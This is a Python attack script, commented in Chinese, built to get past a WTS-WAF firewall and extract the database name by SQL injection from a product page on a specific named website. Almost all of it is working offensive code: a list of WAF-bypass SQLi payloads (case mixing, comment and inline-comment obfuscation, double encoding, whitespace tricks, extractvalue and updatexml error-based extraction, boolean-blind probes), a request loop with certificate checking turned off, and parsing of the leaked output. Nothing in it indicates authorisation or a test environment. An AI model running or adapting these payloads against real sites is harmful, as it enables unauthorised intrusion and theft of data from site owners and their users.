#!/usr/bin/env python3
"""yijing_waf_bypass.py - yijingweb.com SQLi WTS-WAF绕过测试
目标: 绕过WTS-WAF提取database()
"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

# 各种WAF绕过payload
PAYLOADS = [
    # 原始(被拦)
    ("原始extractvalue", "687' and extractvalue(1,concat(0x7e,database()))-- "),
    # 大小写混写
    ("大小写", "687' AnD ExtracTValue(1,Concat(0x7e,DataBase()))-- "),
    # && 替代 and
    ("&&替代and", "687' && extractvalue(1,concat(0x7e,database()))-- "),
    # || 替代 or
    ("||", "687' || extractvalue(1,concat(0x7e,database()))-- "),
    # 注释混淆
    ("注释混淆", "687' and/**/extractvalue/**/(1,concat(0x7e,database()))-- "),
    # updatexml替代
    ("updatexml", "687' and updatexml(1,concat(0x7e,database()),1)-- "),
    # 内联注释
    ("内联注释", "687' /*!50000and*/ extractvalue(1,concat(0x7e,database()))-- "),
    # 双重编码
    ("双重编码and", "687' %2561nd extractvalue(1,concat(0x7e,database()))-- "),
    # 换行绕过
    ("换行", "687' and%0aextractvalue(1,concat(0x7e,database()))-- "),
    # tab
    ("tab", "687' and\textractvalue(1,concat(0x7e,database()))-- "),
    # 算术+benchmark
    ("if判断", "687' and if(1=1,1,0)-- "),
    # 布尔盲注基础
    ("布尔and1=1", "687' and 1=1-- "),
    ("布尔and1=2", "687' and 1=2-- "),
]

def test(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        return r.read(60000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.read(60000).decode('utf-8','ignore')
    except Exception as e:
        return 'ERR:%s' % repr(e)[:50]

for name, payload in PAYLOADS:
    resp = test(payload)
    if 'WTS-WAF' in resp or '拦截' in resp:
        print('[拦] %s: WAF拦截' % name)
    elif 'XPATH syntax error' in resp or 'database' in resp.lower() and '~' in resp:
        print('[✓] %s: 绕过成功! 响应含XPATH错误' % name)
        m = re.search(r"XPATH syntax error: '([^']+)'", resp)
        if m:
            print('    提取到: %s' % m.group(1))
    elif 'MySQL Error' in resp or 'Invalid SQL' in resp:
        # 提取报错内容
        m = re.search(r'Invalid SQL: ([^<]+)', resp)
        print('[?] %s: MySQL报错 %s' % (name, m.group(1)[:80] if m else ''))
    else:
        print('[?] %s: 其他(len=%d) %s' % (name, len(resp), resp[:60].replace('\r',' ').replace('\n',' ')))
